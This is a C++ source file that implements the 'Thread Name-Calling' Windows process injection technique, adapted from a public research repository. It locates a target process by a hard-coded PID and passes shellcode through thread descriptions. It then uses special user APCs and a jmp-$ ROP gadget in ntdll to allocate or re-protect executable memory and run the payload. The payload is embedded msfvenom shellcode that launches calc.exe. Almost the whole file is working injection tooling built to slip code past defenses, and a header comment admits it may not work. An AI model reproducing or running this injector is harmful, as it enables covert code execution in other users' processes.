/*
* Title: Thread Name-Calling
* Resources:
*	- https://github.com/hasherezade/thread_namecalling
*	- https://research.checkpoint.com/2024/thread-name-calling-using-thread-name-for-offense/
* Status: Although I may have overlooked something, this technique may not work due to the difference between 'testBuf' and 'EBFE_VA' after calling the ReadRemote function in the WriteNameAndCall function. 
*/
#include <Windows.h>
#include <vector>
#include <TlHelp32.h>
#include "Nt.hpp"
#include "ThreadNameCalling.hpp"

_NtCreateThreadEx ntCreateThreadEx = nullptr;
_NtQueueApcThreadEx2 ntQueueApcThreadEx2 = nullptr;
_NtQueryInformationProcess ntQueryInformationProcess = nullptr;
_NtReadVirtualMemory ntReadVirtualMemory = nullptr;
_NtSetInformationThread ntSetInformationThread = nullptr;

ULONG_PTR EBFE_VA = 0; // The pointer address of \xEB\xFE (jmp $)

BOOL InitFunctions() {
	HMODULE hNtdll = GetModuleHandleA("ntdll");
	if (!hNtdll) return FALSE;

	ntCreateThreadEx = reinterpret_cast<_NtCreateThreadEx>(GetProcAddress(hNtdll, "NtCreateThreadEx"));
	if (!ntCreateThreadEx) return FALSE;
	ntQueueApcThreadEx2 = reinterpret_cast<_NtQueueApcThreadEx2>(GetProcAddress(hNtdll, "NtQueueApcThreadEx2"));
	if (!ntQueueApcThreadEx2) return FALSE;
	ntQueryInformationProcess = reinterpret_cast<_NtQueryInformationProcess>(GetProcAddress(hNtdll, "NtQueryInformationProcess"));
	if (!ntQueryInformationProcess) return FALSE;
	ntReadVirtualMemory = reinterpret_cast<_NtReadVirtualMemory>(GetProcAddress(hNtdll, "NtReadVirtualMemory"));
	if (!ntReadVirtualMemory) return FALSE;
	ntSetInformationThread = reinterpret_cast<_NtSetInformationThread>(GetProcAddress(hNtdll, "NtSetInformationThread"));
	if (!ntSetInformationThread) return FALSE;

	return TRUE;
}

// https://github.com/hasherezade/thread_namecalling/blob/master/thread_namecaller/rop_api.h#L13
BYTE* FindPattern(BYTE* secStart, size_t dwSecSize, BYTE* pattern, size_t dwPatternSize) {
	if (!secStart || (dwSecSize < dwPatternSize)) return nullptr;

	for (size_t i = 0; i < dwSecSize; i++) {
		if (dwPatternSize > (dwSecSize - i)) return nullptr;
		BYTE* ptr = secStart + i;
		if (::memcmp(ptr, pattern, dwPatternSize) == 0) {
			return ptr;
		}
	}

	return nullptr;
}

// https://github.com/hasherezade/thread_namecalling/blob/master/thread_namecaller/rop_api.h#L28
LPVOID FindRopGadget(LPSTR lpModuleName, BYTE* pattern, size_t dwPatternSize) {
	HANDLE hMod = GetModuleHandleA(lpModuleName);
	if (!hMod) return nullptr;

	PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)hMod;
	if (pDosHeader->e_magic != IMAGE_DOS_SIGNATURE) {
		return nullptr;
	}
	PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)((PUCHAR)hMod + pDosHeader->e_lfanew);
	if (pNtHeaders->Signature != IMAGE_NT_SIGNATURE) {
		return nullptr;
	}
	PIMAGE_SECTION_HEADER pSecHeader = IMAGE_FIRST_SECTION(pNtHeaders);
	if (!pSecHeader) return nullptr;

	for (WORD i = 0; i < pNtHeaders->FileHeader.NumberOfSections; i++) {
		if ((pSecHeader[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) &&
			pSecHeader[i].VirtualAddress &&
			pSecHeader[i].Misc.VirtualSize)
		{
			BYTE* ptr = FindPattern(
				(BYTE*)hMod + pSecHeader[i].VirtualAddress,
				pSecHeader[i].Misc.VirtualSize,
				pattern,
				dwPatternSize
			);
			if (ptr) return ptr;
		}
	}

	return nullptr;
}

// https://github.com/hasherezade/thread_namecalling/blob/master/thread_namecaller/rop_api.h#L208
BOOL InitGadgets() {
	BYTE pattern[] = { 0xEB, 0xFE }; // `jmp $` for infinite loop.
	LPVOID lpPos = FindRopGadget((LPSTR)"ntdll", pattern, sizeof(pattern));
	if (!lpPos) return FALSE;

	EBFE_VA = (ULONG_PTR)lpPos;
	
	return TRUE;
}

// https://github.com/hasherezade/thread_namecalling/blob/master/common.cpp#L81
HANDLE CreateAlertableThread(HANDLE hProcess) {
	DWORD dwAccess = SYNCHRONIZE | THREAD_ALL_ACCESS;
	HANDLE hThread = nullptr;
	NTSTATUS status = ntCreateThreadEx(
		&hThread,
		dwAccess,
		nullptr,
		hProcess,
		(PUSER_THREAD_START_ROUTINE)Sleep,
		(LPVOID)10,
		1, // THREAD_CREATE_FLAGS_CREATE_SUSPENDED
		0,
		0,
		0,
		nullptr
	);
	if (!NT_SUCCESS(status)) {
		return nullptr;
	}

	return hThread;
}

size_t ListThreadIds(HANDLE hProcess, std::vector<DWORD>& threadIds) {
	DWORD dwTargetPid = GetProcessId(hProcess);
	HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
	THREADENTRY32 entry = { sizeof(THREADENTRY32) };

	GUITHREADINFO gui = { 0 };
	gui.cbSize = sizeof(GUITHREADINFO);

	if (Thread32First(hSnapshot, &entry)) {
		do {
			if (entry.th32OwnerProcessID == dwTargetPid) {
				threadIds.push_back(entry.th32ThreadID);
			}
		} while (Thread32Next(hSnapshot, &entry));
	}
	CloseHandle(hSnapshot);

	return threadIds.size();
}

HANDLE FindThread(HANDLE hProcess, DWORD dwMinAccess, BOOL bUseDefaultSetThreadDesc) {
	std::vector<DWORD> threadIds;
	if (!ListThreadIds(hProcess, threadIds)) {
		return nullptr;
	}

	HANDLE hThread = nullptr;
	DWORD dwAccess = SYNCHRONIZE | dwMinAccess;
	
	//for (auto itr = threadIds.begin(); itr != threadIds.end(); ++itr) {
	for (auto dwThreadId : threadIds) {
		//DWORD dwThreadId = *itr;
		HANDLE hThread = OpenThread(dwAccess, FALSE, dwThreadId);
		if (!hThread || hThread == INVALID_HANDLE_VALUE) {
			continue;
		}
		return hThread;
	}

	return nullptr;
}

HRESULT CustomSetThreadDescription(HANDLE hThread, const BYTE* buf, size_t dwBufSize) {
	UNICODE_STRING DestString = { 0 };
	BYTE* padding = (BYTE*)::calloc(dwBufSize + sizeof(WCHAR), 1);
	::memset(padding, 'A', dwBufSize);

	RtlInitUnicodeString(&DestString, (PCWSTR)padding);
	::memcpy(DestString.Buffer, buf, dwBufSize);

	NTSTATUS status = ntSetInformationThread(hThread, (THREADINFOCLASS)ThreadNameInformation, &DestString, sizeof(UNICODE_STRING));
	::free(padding);
	return HRESULT_FROM_NT(status);
}

// https://github.com/hasherezade/thread_namecalling/blob/master/ntdll_wrappers.cpp#L26
BOOL ReadRemote(HANDLE hProcess, const void* remoteAddr, void* buf, size_t dwBufSize) {
	if (!buf || dwBufSize == 0) return FALSE;

	::memset(buf, 0, dwBufSize);

	SIZE_T dwBytesRead = 0;
	NTSTATUS status = ntReadVirtualMemory(hProcess, (PVOID)remoteAddr, buf, dwBufSize, &dwBytesRead);
	if (!NT_SUCCESS(status) || dwBytesRead != dwBufSize) {
		return FALSE;
	}

	return TRUE;
}

void* ReadRemotePtr(HANDLE hProcess, const void* remotePtr, bool& isRead) {
	void* wPtr = nullptr;
	if (!ReadRemote(hProcess, remotePtr, &wPtr, sizeof(void*))) {
		isRead = false;
		return nullptr;
	}
	isRead = true;
	return wPtr;
}

// https://github.com/hasherezade/thread_namecalling/blob/master/common.cpp#L143
void* PassViaThreadName(
	HANDLE hProcess,
	const BYTE* buf,
	size_t dwBufSize,
	const void* remotePtr,
	BOOL bUseNewThreads,
	BOOL bUseDefaultSetThreadDesc
) {
	if (!remotePtr) return nullptr;

	HANDLE hThread = nullptr;
	if (bUseNewThreads) {
		hThread = CreateAlertableThread(hProcess);
	}
	else {
		DWORD dwAccess = SYNCHRONIZE;
		dwAccess |= THREAD_SET_CONTEXT; // required for the APC queue
		dwAccess |= THREAD_SET_LIMITED_INFORMATION; // required for setting thread description

		hThread = FindThread(hProcess, dwAccess, bUseDefaultSetThreadDesc);
	}

	if (!hThread || hThread == INVALID_HANDLE_VALUE) return nullptr;

	// Set the thread description.
	HRESULT hRes = 0;
	if (bUseDefaultSetThreadDesc) {
		hRes = SetThreadDescription(hThread, (PCWSTR)buf);
	}
	else {
		hRes = CustomSetThreadDescription(hThread, buf, dwBufSize);
	}

	if (FAILED(hRes)) {
		return nullptr;
	}

	NTSTATUS status = ntQueueApcThreadEx2(
		hThread,
		nullptr,
		QUEUE_USER_APC_FLAGS_SPECIAL_USER_APC,
		(PPS_APC_ROUTINE)GetThreadDescription,
		(PVOID)NtCurrentThread(),
		(PVOID)remotePtr,
		nullptr
	); 
	if (!NT_SUCCESS(status)){
		CloseHandle(hThread);
		return nullptr;
	}

	if (bUseNewThreads) {
		ResumeThread(hThread);
	}
	
	CloseHandle(hThread);

	void* wPtr = nullptr;
	bool isRead = false;
	while ((wPtr = ReadRemotePtr(hProcess, remotePtr, isRead)) == nullptr) {
		if (!isRead) return nullptr;
		Sleep(1000); // waiting for the pointer to be written.
	}
	return wPtr;
}

BOOL Contains(DWORD64 list[], size_t dwListSize, DWORD64 dwSearchedVal) {
	if (!list || !dwListSize) return FALSE;

	for (size_t i = 0; i < dwListSize; i++) {
		if (list[i] == dwSearchedVal) return TRUE;
	}

	return FALSE;
}

size_t FindNtdllFuncEndings(LPSTR funcName, DWORD64 funcRets[], size_t dwMaxRets) {
	BYTE retPattern[] = { 0xc3 };
	FARPROC funcStart = GetProcAddress(GetModuleHandleA("ntdll.dll"), funcName);
	if (!funcStart) return 0;

	ULONG_PTR start = (ULONG_PTR)funcStart;
	size_t i = 0;
	for (i = 0; i < dwMaxRets; i++) {
		void* funcRet = FindPattern((BYTE*)start, 0x100, retPattern, sizeof(retPattern));
		if (!funcRet) {
			return 0;
		}
		funcRets[i] = (DWORD64)funcRet;
		start = (ULONG_PTR)funcRet + 1;
	}

	return i;
}

BOOL WaitForExecution(
	HANDLE hThread,
	DWORD64 desiredRipList[],
	SIZE_T dwDesiredRipListSize,
	DWORD64* dwResult,
	const DWORD dwTimeout
) {
	if (!desiredRipList || !dwDesiredRipListSize) return FALSE;

	DWORD dwAttempts = 0;
	const DWORD dwWaitUnit = WAIT_UNIT;

	BOOL bExecuted = FALSE;
	// Wait for context to change.
	while ((dwTimeout == INFINITE) || (dwWaitUnit * dwAttempts) < dwTimeout) {
		CONTEXT ctx = { 0 };
		ctx.ContextFlags = CONTEXT_CONTROL | CONTEXT_INTEGER;
		if (!GetThreadContext(hThread, &ctx)) {
			return FALSE;
		}
		// After the function finished, it should return to the inifinite loop
		if (Contains(desiredRipList, dwDesiredRipListSize, ctx.Rip)) {
			bExecuted = TRUE;
			if (dwResult)
				*dwResult = ctx.Rax;
		}
		Sleep(dwWaitUnit);
		dwAttempts++;
	}
	
	if (bExecuted) {
		printf("Executed in: %d attempts\n", dwAttempts);
	}
	return bExecuted;
}

BOOL WaitForExecution(HANDLE hThread, DWORD64 dwDesiredRip, DWORD64* dwResult, const DWORD dwTimeout) {
	return WaitForExecution(hThread, &dwDesiredRip, 1, dwResult, dwTimeout);
}

BOOL SetThreadSleep(HANDLE hThread, DWORD dwSleepTime, size_t dwTimeout = INFINITE) {
	if (dwSleepTime < WAIT_UNIT) {
		dwSleepTime = WAIT_UNIT * 2;
	}

	DWORD64 NtDelayExecution_rets[2] = { 0 };
	size_t dwPatternsCount = FindNtdllFuncEndings((LPSTR)"NtDelayExecution", NtDelayExecution_rets, 2);
	if (!dwPatternsCount) {
		return FALSE;
	}
	if (!ntQueueApcThreadEx2(
		hThread,
		nullptr,
		QUEUE_USER_APC_FLAGS_SPECIAL_USER_APC,
		(PPS_APC_ROUTINE)Sleep,
		(void*)dwSleepTime,
		nullptr,
		nullptr
	)) {
		return FALSE;
	}

	if (!WaitForExecution(hThread, NtDelayExecution_rets, dwPatternsCount, nullptr, dwTimeout)) {
		return FALSE;
	}

	return TRUE;
}

BOOL SetContext(HANDLE hThread, CONTEXT& destCtx) {
	BOOL bOk = FALSE;
	SuspendThread(hThread);
	if (SetThreadContext(hThread, &destCtx)) {
		bOk = TRUE;
	}
	ResumeThread(hThread);
	return bOk;
}

BOOL ExecuteContext(
	HANDLE hThread,
	CONTEXT* storedCtx,
	LPVOID lpFunc,
	LPVOID lpStack,
	DWORD64* arg0,
	DWORD64* arg1,
	DWORD64* arg2,
	DWORD64* arg3,
	DWORD64* dwResult
) {
	SuspendThread(hThread);
	CONTEXT ctx = { 0 };
	ctx.ContextFlags = CONTEXT_FULL;
	if (!GetThreadContext(hThread, &ctx)) {
		return FALSE;
	}
	if (storedCtx) {
		::memcpy(storedCtx, &ctx, sizeof(CONTEXT));
	}

	BOOL bOk = FALSE;

	if (ctx.Rip != (DWORD64)EBFE_VA) {
		ctx.Rsp = (DWORD64)lpStack;
		if (SetThreadContext(hThread, &ctx)) {
			bOk = TRUE;
		}
		ResumeThread(hThread);

		if (!bOk || !WaitForExecution(hThread, EBFE_VA, nullptr, TIMEOUT)) {
			return FALSE;
		}
		SuspendThread(hThread);
	}

	ctx.Rip = (DWORD64)lpFunc;
	ctx.Rsp = (DWORD64)lpStack;
	// Set arguments.
	if (arg0) ctx.Rcx = *arg0;
	if (arg1) ctx.Rdx = *arg1;
	if (arg2) ctx.R8 = *arg2;
	if (arg3) ctx.R9 = *arg3;

	if (SetThreadContext(hThread, &ctx)) {
		bOk = TRUE;
	}
	ResumeThread(hThread);
	if (!bOk) {
		return FALSE;
	}
	return WaitForExecution(hThread, EBFE_VA, dwResult, TIMEOUT);
}

LPVOID RemoteVirtualAlloc(
	HANDLE hThread,
	LPVOID data,
	CONTEXT* storedCtx,
	LPVOID lpAddress,
	SIZE_T dwSize,
	DWORD flAllocationType,
	DWORD flProtect
) {
	FARPROC _VirtualAlloc = GetProcAddress(GetModuleHandleA("kernel32"), "VirtualAlloc");
	CONTEXT ctx = { 0 };
	ctx.Rcx = (DWORD64)lpAddress;
	ctx.Rdx = (DWORD64)dwSize;
	ctx.R8 = (DWORD64)flAllocationType;
	ctx.R9 = (DWORD64)flProtect;

	DWORD64 dwResult = 0;
	if (!ExecuteContext(hThread, storedCtx, _VirtualAlloc, data, &ctx.Rcx, &ctx.Rdx, &ctx.R8, &ctx.R9, &dwResult)) {
		return nullptr;
	}

	return (LPVOID)dwResult;
}

BOOL RemoteVirtualProtect(
	HANDLE hThread,
	LPVOID data,
	CONTEXT* storedCtx,
	LPVOID lpAddress,
	SIZE_T dwSize,
	DWORD flNewProtect,
	PDWORD lpflOldProtect
) {
	FARPROC _VirtualProtect = GetProcAddress(GetModuleHandleA("kernel32"), "VirtualProtect");
	CONTEXT ctx = { 0 };
	// Set arguments.
	ctx.Rcx = (DWORD64)lpAddress;
	ctx.Rdx = (DWORD64)dwSize;
	ctx.R8 = (DWORD64)flNewProtect;
	ctx.R9 = (DWORD64)lpflOldProtect;

	DWORD64 dwResult = 0;
	if (!ExecuteContext(hThread, storedCtx, _VirtualProtect, data, &ctx.Rcx, &ctx.Rdx, &ctx.R8, &ctx.R9, &dwResult)) {
		return FALSE;
	}

	return (BOOL)dwResult;
}

BOOL MakeExecutable(
	HANDLE hProcess,
	HANDLE hThread,
	void* shcPtr,
	size_t dwPayloadSize,
	void* stackPtr,
	BOOL bUseRop
) {
	BOOL bExecutable = FALSE;

	if (bUseRop) {
		if (!stackPtr || !EBFE_VA) {
			return FALSE;
		}

		const DWORD dwSleepTime = WAIT_UNIT * 2;
		if (!SetThreadSleep(hThread, dwSleepTime)) {
			return FALSE;
		}
		CONTEXT storedCtx = { 0 };
		PDWORD oldProtect = (PDWORD)((ULONG_PTR)stackPtr + 8);
		bExecutable = RemoteVirtualProtect(hThread, (LPVOID)stackPtr, &storedCtx, (LPVOID)shcPtr, dwPayloadSize, PAGE_EXECUTE_READWRITE, oldProtect);
		if (bExecutable) {
			printf("RemoteVirtualProtect succeeded!\n");
		}
		if (SetContext(hThread, storedCtx)) {
			printf("Reverted to the initial context\n");
		}
	}
	else {
		DWORD oldProtect = 0;
		if (!VirtualProtectEx(hProcess, shcPtr, dwPayloadSize, PAGE_EXECUTE_READWRITE, &oldProtect)) {
			return FALSE;
		}
		bExecutable = TRUE;
	}

	return bExecutable;
}

LPVOID MoveToNewExecutable(
	HANDLE hProcess,
	HANDLE hThread,
	void* remotePtr,
	size_t dwPayloadSize,
	void* stackPtr,
	BOOL bUseRop
) {
	LPVOID shcPtr = nullptr;

	if (bUseRop) {
		if (!stackPtr || !EBFE_VA) {
			return nullptr;
		}
		const DWORD dwSleepTime = 2 * WAIT_UNIT;
		if (!SetThreadSleep(hThread, dwSleepTime)) {
			return nullptr;
		}
		// Now thread switched into a sleep mode.
		CONTEXT storedCtx = { 0 };
		LPVOID allocatedPtr = RemoteVirtualAlloc(hThread, (LPVOID)stackPtr, &storedCtx, 0, dwPayloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
		if (allocatedPtr) {
			shcPtr = allocatedPtr;
		}
		if (SetContext(hThread, storedCtx)) {
			printf("Reverted to the initial context\n");
		}
	}
	else {
		shcPtr = VirtualAllocEx(hProcess, nullptr, dwPayloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	}

	if (!shcPtr) return nullptr;

	void* _RtlMoveMemoryPtr = GetProcAddress(GetModuleHandleA("ntdll.dll"), "RtlMoveMemory");
	if (!_RtlMoveMemoryPtr) {
		return nullptr;
	}
	if (!ntQueueApcThreadEx2(
		hThread,
		nullptr,
		QUEUE_USER_APC_FLAGS_SPECIAL_USER_APC,
		(PPS_APC_ROUTINE)_RtlMoveMemoryPtr,
		shcPtr,
		remotePtr,
		(LPVOID)dwPayloadSize
	)) {
		return FALSE;
	}

	return shcPtr;
}

BOOL RunInjected(
	HANDLE hProcess,
	void* remotePtr,
	size_t dwPayloadSize,
	void* stackPtr,
	BOOL bUseRop,
	BOOL bUseNewThreads,
	BOOL bUseDefaultSetThreadDesc,
	BOOL bUseNewBuffer,
	BOOL bUseProxyFunc
) {
	void* shcPtr = nullptr;

	DWORD dwAccess = SYNCHRONIZE;
	dwAccess |= THREAD_SET_CONTEXT;
	if (bUseRop) {
		dwAccess |= THREAD_GET_CONTEXT;
		dwAccess |= THREAD_SUSPEND_RESUME;
	}

	HANDLE hThread = nullptr;
	if (bUseNewThreads) {
		hThread = CreateAlertableThread(hProcess);
	}
	else {
		hThread = FindThread(hProcess, dwAccess, bUseDefaultSetThreadDesc);
	}
	
	if (!hThread || hThread == INVALID_HANDLE_VALUE) {
		return FALSE;
	}

	BOOL bExecutable = FALSE;

	if (bUseNewBuffer) {
		shcPtr = MoveToNewExecutable(hProcess, hThread, remotePtr, dwPayloadSize, stackPtr, bUseRop);
	}
	else {
		if (MakeExecutable(hProcess, hThread, remotePtr, dwPayloadSize, stackPtr, bUseRop)) {
			shcPtr = remotePtr;
		}
	}

	if (!shcPtr) {
		return FALSE;
	}

	BOOL bOk = FALSE;

	if (bUseProxyFunc) {
		auto _RtlDispatchAPC = GetProcAddress(GetModuleHandleA("ntdll.dll"), MAKEINTRESOURCEA(8));
		if (_RtlDispatchAPC) {
			if (ntQueueApcThreadEx2(
				hThread,
				nullptr,
				QUEUE_USER_APC_FLAGS_SPECIAL_USER_APC,
				(PPS_APC_ROUTINE)_RtlDispatchAPC,
				shcPtr,
				0,
				(LPVOID)-1
			)) {
				bOk = TRUE;
			}
		}
		else {
			if (ntQueueApcThreadEx2(
				hThread,
				nullptr,
				QUEUE_USER_APC_FLAGS_SPECIAL_USER_APC,
				(PPS_APC_ROUTINE)shcPtr,
				0,
				0,
				0
			)) {
				bOk = TRUE;
			}
		}
	}

	if (bUseNewThreads) {
		ResumeThread(hThread);
	}
	
	CloseHandle(hThread);
	return bOk;
}

// https://github.com/hasherezade/thread_namecalling/blob/master/thread_namecaller/main.cpp#L186
BOOL WriteNameAndCall(
	HANDLE hProcess,
	BYTE* payload,
	const size_t dwPayloadSize,
	void* remotePtr,
	BOOL bUseRop,
	BOOL bUseNewThreads,
	BOOL bUseDefaultSetThreadDesc,
	BOOL bUseNewBuffer,
	BOOL bUseProxyFunc
) {
	BYTE* threadName = nullptr;
	size_t dwThreadNameSize = 0;

	BYTE* data = nullptr;
	const size_t dwStackPadding = 0x100;
	size_t dwStackSize = dwStackPadding * 2;

	if (bUseRop) {
		if (!InitGadgets() || !EBFE_VA) {
			return FALSE;
		}

		data = (BYTE*)::calloc(dwPayloadSize + dwStackSize, 1);
		if (!data) return FALSE;

		::memcpy(data, payload, dwPayloadSize);

		ULONG_PTR paddedStack = (ULONG_PTR)data + dwPayloadSize + dwStackPadding;
		ULONG_PTR* paddedStackPtr = (ULONG_PTR*)paddedStack;
		*paddedStackPtr = EBFE_VA; // Write an address of the gadget on the stack.
		threadName = data;
		dwThreadNameSize = dwPayloadSize + dwStackSize;
	}
	else {
		threadName = payload;
		dwThreadNameSize = dwPayloadSize;
	}

	void* shcPtr = PassViaThreadName(
		hProcess,
		threadName,
		dwThreadNameSize,
		remotePtr,
		bUseNewThreads,
		bUseDefaultSetThreadDesc
	);

	void* remoteStackPtr = nullptr;

	if (bUseRop) {
		free(data); data = nullptr;
		if (shcPtr) {
			remoteStackPtr = (void*)((ULONG_PTR)shcPtr + dwPayloadSize + dwStackPadding);

			// Double-check if the passed data is correct.
			ULONG_PTR testBuf = 0;
			if (!ReadRemote(hProcess, remoteStackPtr, &testBuf, sizeof(testBuf))) {
				return FALSE;
			}
			if (testBuf != EBFE_VA) {
				printf("Invalid remote stack: 0x%x\n", testBuf);
				printf("EBFE_VA: 0x%x\n", EBFE_VA);
				return FALSE;
			}
		}
	}

	if (!shcPtr) return FALSE;

	return RunInjected(
		hProcess,
		shcPtr,
		dwPayloadSize,
		remoteStackPtr,
		bUseRop,
		bUseNewThreads,
		bUseDefaultSetThreadDesc,
		bUseNewBuffer,
		bUseProxyFunc
	);
}

// https://github.com/hasherezade/thread_namecalling/blob/master/thread_namecaller/main.cpp#L246
BOOL ThreadNameCalling() {
	// Change the following values if needed.
	DWORD dwPid = 29272; // The target PID.
	BOOL bUseRop = TRUE;
	BOOL bUseNewThreads = TRUE;
	BOOL bUseDefaultSetThreadDesc = TRUE;
	BOOL bUseNewBuffer = TRUE;
	BOOL bUseProxyFunc = TRUE;

	// Shellcode is generated with `msfvenom -p windows/x64/exec CMD=calc.exe -f c`
	unsigned char shellcode[] =
		"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"
		"\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"
		"\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a"
		"\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"
		"\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52"
		"\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48"
		"\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40"
		"\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48"
		"\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41"
		"\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1"
		"\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c"
		"\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01"
		"\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a"
		"\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b"
		"\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"
		"\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b"
		"\x6f\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd"
		"\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
		"\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
		"\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00";

	if (!InitFunctions()) return FALSE;

	// Open the target process.
	DWORD dwAccess = PROCESS_QUERY_LIMITED_INFORMATION | PROCESS_VM_READ;
	if (bUseRop)
		dwAccess |= PROCESS_VM_OPERATION;
	if (bUseNewThreads)
		dwAccess |= PROCESS_CREATE_THREAD;
	HANDLE hProcess = OpenProcess(dwAccess, FALSE, dwPid);
	if (!hProcess) return FALSE;

	// Get the PEB address of the target process.
	// https://github.com/hasherezade/thread_namecalling/blob/master/common.cpp#L108
	PROCESS_BASIC_INFORMATION pi = { 0 };
	DWORD dwReturnLength = 0;
	NTSTATUS status = ntQueryInformationProcess(
		hProcess,
		ProcessBasicInformation,
		&pi,
		sizeof(PROCESS_BASIC_INFORMATION),
		&dwReturnLength
	);
	if (!NT_SUCCESS(status)) {
		CloseHandle(hProcess);
		return FALSE;
	}
	ULONG_PTR pebAddr = (ULONG_PTR)pi.PebBaseAddress;

	// https://github.com/hasherezade/thread_namecalling/blob/master/common.cpp#L131
	const ULONG_PTR UNUSED_OFFSET = 0x340;
	const ULONG_PTR remotePtr = pebAddr + UNUSED_OFFSET;
	PVOID pRemotePtr = (PVOID)remotePtr;

	if (!WriteNameAndCall(
		hProcess,
		shellcode,
		sizeof(shellcode),
		pRemotePtr,
		bUseRop,
		bUseNewThreads,
		bUseDefaultSetThreadDesc,
		bUseNewBuffer,
		bUseProxyFunc
	)) {
		CloseHandle(hProcess);
		return FALSE;
	}

	CloseHandle(hProcess);

	return TRUE;
}
